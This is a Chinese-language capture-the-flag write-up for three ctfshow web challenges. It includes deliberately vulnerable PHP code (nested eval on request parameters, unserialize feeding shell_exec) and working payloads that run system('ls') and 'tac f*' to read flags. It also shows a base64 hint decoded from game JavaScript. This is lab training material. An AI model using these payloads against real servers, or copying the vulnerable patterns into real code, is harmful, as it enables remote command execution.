# Web_菜狗杯

## web签到

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2022-11-10 17:20:38
# @Last Modified by:   h1xa
# @Last Modified time: 2022-11-11 09:38:59
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


error_reporting(0);
highlight_file(__FILE__);

eval($_REQUEST[$_GET[$_POST[$_COOKIE['CTFshow-QQ群:']]]][6][0][7][5][8][0][9][4][4]);
```

一个非常非常套娃的题目，首先看里面，要执行一个命令。

这个命令的组成为：

1. 一个含GET请求的REQUEST
2. 这个GET请求包含着的是一个POST值
3. POST值为CTFshow-QQ群:为名的cookie值。

在这段主体后面还会加上607580944数字。

构造payload如下：

```
?b=c&c[0]=1&c[6][0][7][5][8][0][9][4][4]=system("ls");
POST:a=b
Cookie:CTFshow-QQ%E7%BE%A4%3A=a
```

得到flag。



## webshell

```
 <?php 
    error_reporting(0);

    class Webshell {
        public $cmd = 'echo "Hello World!"';

        public function __construct() {
            $this->init();
        }

        public function init() {
            if (!preg_match('/flag/i', $this->cmd)) {        #这里的i表示忽略大小写
                $this->exec($this->cmd);
            }
        }

        public function exec($cmd) {
            $result = shell_exec($cmd);
            echo $result;
        }
    }

    if(isset($_GET['cmd'])) {
        $serializecmd = $_GET['cmd'];
        $unserializecmd = unserialize($serializecmd);
        $unserializecmd->init();
    }
    else {
        highlight_file(__FILE__);
    }

?> 

```

提供的代码是一个PHP脚本，看起来是一个Webshell。Webshell是一种恶意脚本，可以上传到Web服务器上，以获取未经授权的访问和对服务器的控制。它允许攻击者在服务器上执行任意命令，并可能进行恶意活动。

让我们逐步分解代码：

error_reporting(0) 这一行将错误报告级别设置为0，这意味着不会显示任何PHP错误或警告。这通常在恶意脚本中使用，以隐藏可能暴露Webshell存在的任何错误。

代码定义了一个名为 Webshell 的类。它有一个公共属性 $cmd，其初始值为 'echo "Hello World!"'。

__construct() 方法是类的构造函数，它调用 init() 方法。

init() 方法检查 $cmd 变量中的字符串是否不包含大小写不敏感的子字符串 "flag"。如果条件为真，则调用 exec() 方法，传递 $cmd 的值。

exec() 方法使用 shell_exec() 函数执行命令，并将结果打印输出。

如果通过GET请求传递了名为 cmd 的参数，代码将尝试对参数进行反序列化，并调用 $unserializecmd->init() 方法。否则，代码将显示自身的源代码

根据代码逻辑
创建一个Webshell类的实例$test
然后通过_construct()函数传入cmd的参数，这里设置cmd=ls
最后使用 serialize() 函数将该实例序列化并输出。

```
<?php
	$test = new Webshell();
	$test->cmd = "tac f*";
	$serialize = serialize($test);
	echo $serialize;
?>
```

生成结果为：O:8:"Webshell":1:{s:3:"cmd";s:6:"tac f*";} 

payload:?cmd=O:8:"Webshell":1:{s:3:"cmd";s:6:"tac f*";} 

直接出flag。

![](.\图片\webshell.png)

## taptaptap

进入环境发现是一个游戏，那就F12看源码

然后会发现源码会提示你去看一下habibiScript.js，打开，会看到很多代码

在game engine中发现这两行

```
console.log(atob('WW91ciBmbGFnIGlzIGluIC9zZWNyZXRfcGF0aF95b3VfZG9fbm90X2tub3cvc2VjcmV0ZmlsZS50eHQ='));
      alert(atob('WW91ciBmbGFnIGlzIGluIC9zZWNyZXRfcGF0aF95b3VfZG9fbm90X2tub3cvc2VjcmV0ZmlsZS50eHQ='));
```

解码这个base64，得到Your flag is in /secret_path_you_do_not_know/secretfile.txt

直接访问即可得到flag。

![](.\图片\taptaptap.png)



## 